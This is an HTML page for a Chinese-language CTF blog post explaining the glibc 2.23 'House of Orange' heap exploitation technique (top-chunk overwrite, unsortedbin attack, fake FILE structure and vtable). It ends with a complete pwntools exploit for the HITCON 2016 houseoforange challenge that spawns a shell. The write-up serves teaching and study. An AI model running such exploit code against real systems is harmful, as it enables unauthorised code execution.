@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          House of Orange - C12en
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>C12EN</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一个house of链应该算是最早的伪造io file来达到攻击目的的链了</p>
+<p>借助这个来熟悉一下file结构体 这个链本身现在已经失去价值了 只能适用于libc2.23及以前的版本</p>
+<p>这条链可以突破没有free函数的限制 并且达到劫持程序执行流的目的</p>
+<h1 id="File结构"><a href="#File结构" class="headerlink" title="File结构"></a>File结构</h1><p>File是linux标准IO库中用来描述文件的结构 程序的许多操作会涉及到遍历File结构体来获取对应指针</p>
+<p>file结构的本质上是一个链表 链表头为IO_list_all 每个file结构的chain域指向下一个file结构</p>
+<p>每个程序启动时有三个文件流是默认打开的 就是stdin stdout stderr</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111040002.png" alt="image-20230511104043909"></p>
+<p>至于vtable 是一个存放许多函数指针的结构体</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111042480.png" alt="image-20230511104224447"></p>
+<p>house of orange所涉及到的就是伪造上述的这两个结构体 从而劫持程序执行流</p>
+<h1 id="链路流程分析"><a href="#链路流程分析" class="headerlink" title="链路流程分析"></a>链路流程分析</h1><p>我们知道 当plmalloc初始化堆后 如果bin中没有合适的chunk 就会从top chunk中分配所需要的chunk 那么如果所申请的chunk大于top chunk呢 分两种情况</p>
+<p>一种是申请的chunk的size过大 需要通过mmap来分配 那么这种情况分配到的chunk就会位于libc地址上的一块空间</p>
+<p>还有一种是top chunk过小 那么此时就会把top chunk释放进入unsortedbin 随后再次申请一个top chunk 从新的top chunk中分配所需要的chunk 不过释放top chunk还需要进行一次判断 下面来看一下源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas and mmap also failed.  */</span></span><br><span class="line"> <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line"> old_top = av-&gt;top;</span><br><span class="line"> old_size = chunksize (old_top);</span><br><span class="line"> old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line"> brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">    at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse (old_top) &amp;&amp;</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line"> assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>
+
+<p>可以看到需要进行两次的assert检查</p>
+<p>第一次 对top chunk的大小进行检查 需要大于MINSIZE 并且Prev_inuse位要为1 top chunk的addr和size加起来还要满足刚好为一个页</p>
+<p>我们覆盖top chunk的size 使得其不足以供我们分配 这个size要使得top chunk的结尾后3位为000</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111102768.png" alt="image-20230511110256747"></p>
+<p>此时我们覆盖top chunk的size 接下来申请一个大于其size的chunk top chunk就会被释放进入unsortedbin</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111103023.png" alt="image-20230511110308999"></p>
+<p>通过这种办法 可以在程序没有给予释放chunk的函数下 获得一个unsortedbin中的chunk 而在2.23及以下的版本 unsortedbin attack来任意写一个main_arena地址还是可行的 这意味着我们拥有了一次任意写的机会</p>
+<p>我们上面说到过 file结构本质是一个链表 是通过链表头的IO_list_all的chain域来链接到下一个的file结构体</p>
+<p>那么如果我们覆盖IO_list_all指针存放的值 接着伪造一个file结构体 把chain域覆盖成fake_file的地址 就可以实现扰乱程序索引file结构体</p>
+<p>但是unsortedbin attack任意写的功效是有限的 只能写入main_arena+88的地址 那么根据偏移 其chain域会索引到main_arena+88+0x68处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x0   _flags</span><br><span class="line">0x8   _IO_read_ptr</span><br><span class="line">0x10  _IO_read_end</span><br><span class="line">0x18  _IO_read_base</span><br><span class="line">0x20  _IO_write_base</span><br><span class="line">0x28  _IO_write_ptr</span><br><span class="line">0x30  _IO_write_end</span><br><span class="line">0x38  _IO_buf_base</span><br><span class="line">0x40  _IO_buf_end</span><br><span class="line">0x48  _IO_save_base</span><br><span class="line">0x50  _IO_backup_base</span><br><span class="line">0x58  _IO_save_end</span><br><span class="line">0x60  _markers</span><br><span class="line">0x68  _chain</span><br><span class="line">0x70  _fileno</span><br><span class="line">0x74  _flags2</span><br><span class="line">0x78  _old_offset</span><br><span class="line">0x80  _cur_column</span><br><span class="line">0x82  _vtable_offset</span><br><span class="line">0x83  _shortbuf</span><br><span class="line">0x88  _lock</span><br><span class="line">0x90  _offset</span><br><span class="line">0x98  _codecvt</span><br><span class="line">0xa0  _wide_data</span><br><span class="line">0xa8  _freeres_list</span><br><span class="line">0xb0  _freeres_buf</span><br><span class="line">0xb8  __pad5</span><br><span class="line">0xc0  _mode</span><br><span class="line">0xc4  _unused2</span><br><span class="line">0xd8  vtable</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111112871.png" alt="image-20230511111233849"></p>
+<p>而这个偏移的地址 刚好是smallbins中 0x60的链表所位于的地址 所以我们可以释放一个0x60大小的chunk到smallbins 随后任意写覆盖io_list_all为main_arena+88 这样索引到的下一个file结构体就是smallbin chunk  伪造file结构体 就可以在这个chunk中伪造</p>
+<p>接着是如何触发的问题 只是伪造肯定不能满足劫持执行流的目的 同时如何伪造也要根据触发的方式</p>
+<p>这里涉及到了FSOP的知识点</p>
+<p>其是通过IO_flush_all_lockp这个函数 这个函数会刷新io_list_all链表中的所有文件流 相当于对每个函数调用了fflush函数</p>
+<p>而这个函数会调用到file结构体中vtable结构体中的IO_overflow函数 </p>
+<p>如下图 我们这样伪造一个file结构体</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111133873.png" alt="image-20230511113348820"></p>
+<p>其vtable也被我们所伪造 来看以下vtable</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111134659.png" alt="image-20230511113416630"></p>
+<p>将其overflow函数指针伪造成system 接下来利用gdb动调进入IO_flush_all_lockp函数 看看其调用system函数时的rdi参数时什么</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111137278.png"></p>
+<p>可以看到rdi参数实际上是我们所伪造的file结构体的首地址 所以只要使得fake file的首地址为&#x2F;bin&#x2F;sh即可</p>
+<p>那么如何触发IO_flush_all_lockp函数呢 一共有三种选择</p>
+<ol>
+<li><p>当 libc 执行 abort 流程时</p>
+</li>
+<li><p>当执行 exit 函数时</p>
+</li>
+<li><p>当执行流从 main 函数返回时</p>
+</li>
+</ol>
+<p>这里使用的是第一种办法 相对来说更加通用</p>
+<p>这个abort流程是什么呢 实际上我们破坏了堆结构 导致调用malloc_printerr函数来输出错误信息</p>
+<p>至于具体是哪里的我没动调出来 大致的猜测是unsortedbin的bk指向的地址没有构成完整的双向链表导致的进入while循环 但是这个if分支为啥会成立就是个疑点了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br></pre></td></tr></table></figure>
+
+<p>malloc_printerr函数种会调用__libc_message函数</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111330571.png" alt="image-20230511133005494"></p>
+<p>这个函数的内部就调用了abort函数</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111331891.png" alt="image-20230511133146868"></p>
+<p>而abort内部调用了_IO_flush_all_lockp函数 </p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111332940.png" alt="image-20230511133220920"></p>
+<p>于是就可以调用到fake file的io_overflow函数</p>
+<p>同时我们再来看一下_IO_flush_all_lockp函数怎样才能调用了file结构体的io_overflow函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">        &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">      &#123;</span><br><span class="line">        result = EOF;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要使得mode小于等于0 IO_write_ptr大于IO_write_base</p>
+<p>那么就使得io_write_ptr &#x3D; 1 io_write_base &#x3D; mode &#x3D; 0即可</p>
+<p>还有一点需要注意的是 main_arena+88的那个fake file 如果我们触发了_IO_flush_all_lockp函数 其如果满足上面的条件 也是会调用overflow函数 但是很明显不能在这里就调用overflow函数</p>
+<p>如下图 _mode的值是否为正负和aslr和pie导致的地址随机化有关 所以这里存在一个概率打通的问题 需要mode为负才能打通</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111850000.png" alt="image-20230511185011932"></p>
+<h1 id="真题分析"><a href="#真题分析" class="headerlink" title="真题分析"></a>真题分析</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange hitcon 2016"></a>houseoforange hitcon 2016</h2><p>add函数限制了申请chunk的size 小于等于0x1000</p>
+<p>show函数可以打印堆块内容</p>
+<p>edit函数存在堆溢出</p>
+<p>但是没有释放堆块的函数 同时chunk指针只能保存一个 所以show和edit都只对最新申请的chunk有效</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111828689.png" alt="image-20230511182824591"></p>
+<p>申请一个chunk会额外申请两个chunk   低地址处的chunk存放着实际分配的chunk和第三个chunk的地址</p>
+<p>中间的chunk是实际分配的chunk  第三个chunk是用来存放price和color 不过没啥用 这题的核心考点不在于这两个伴随堆块</p>
+<p>利用上面提到的办法 来使得top chunk被释放进入unsortedbin 随后申请一个chunk 就可以泄露libc基址</p>
+<p>并且 如果申请到的是一个largebin chunk 那么还可以顺便泄露一下堆地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x1f</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,cyclic(<span class="number">0x8</span>))</span><br><span class="line">show()</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5188</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">0x10</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">show()</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xc0</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是利用unsortedbin attack来往io_list_all中写入main_arena的地址</p>
+<p>随后计算偏移构造fake file</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_io = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x408</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)  <span class="comment">#填充到old top chunk</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>) <span class="comment">#覆盖size 使其释放到smallbin 0x60链表</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(fake_io-<span class="number">0x10</span>) <span class="comment">#伪造bk域</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#布局io_write_ptr和io_write_base</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#填充偏移</span></span><br><span class="line">payload += fake_file + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_addr+<span class="number">0x5c8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system_addr) <span class="comment">#伪造vtable结构体</span></span><br></pre></td></tr></table></figure>
+
+<p>随后再次进入add函数 只要触发了malloc函数 就可以触发fake file</p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,29861)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x1f</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,cyclic(<span class="number">0x8</span>))</span><br><span class="line">show()</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5188</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">0x10</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">show()</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xc0</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">fake_io = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x408</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)</span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(fake_io-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_file + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_addr+<span class="number">0x5c8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system_addr)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0xD68)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="C"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>C12en</div>
+      <div>2023-05-11</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/heap/">heap</a>
+
+      
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
